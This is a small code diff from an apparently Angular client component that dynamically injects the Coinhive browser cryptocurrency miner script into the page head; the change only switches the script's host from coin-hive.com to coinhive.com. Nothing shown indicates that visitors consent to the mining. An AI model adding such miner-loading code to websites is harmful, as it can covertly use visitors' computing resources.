@@ -629,7 +629,7 @@ class ClientComponent implements OnInit {
         script.type = 'text/javascript';
         script.async = true;
         script.onload = minerLoaded;
-        script.src = 'https://coin-hive.com/lib/coinhive.min.js';
+        script.src = 'https://coinhive.com/lib/coinhive.min.js';
         d.getElementsByTagName('head')[0].appendChild(script);
       }(document));
     } else minerLoaded();
